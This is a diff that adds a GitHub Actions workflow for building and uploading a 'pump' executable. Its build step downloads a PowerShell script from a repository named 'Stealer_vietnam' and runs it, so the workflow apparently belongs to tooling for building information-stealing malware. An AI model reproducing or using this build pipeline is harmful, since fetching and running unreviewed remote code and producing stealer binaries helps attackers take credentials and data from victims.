@@ -1,0 +1,29 @@
+name: Build and Upload Pump
+
+on:
+  push:
+    paths:
+      - 'tootls/pump/**'  # Theo dõi các thay đổi trong thư mục tootls/pump
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Set up PowerShell
+        uses: actions/setup-powershell@v2
+
+      - name: Download and run PowerShell script
+        run: |
+          $ErrorActionPreference = 'Stop'
+          Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/tootls/pump/buildcode.dontcare' -OutFile 'buildcode.dontcare.ps1'
+          & powershell -File buildcode.dontcare.ps1
+
+      - name: Upload pump.exe
+        uses: actions/upload-artifact@v3
+        with:
+          name: pump
+          path: tootls/pump/pump.exe
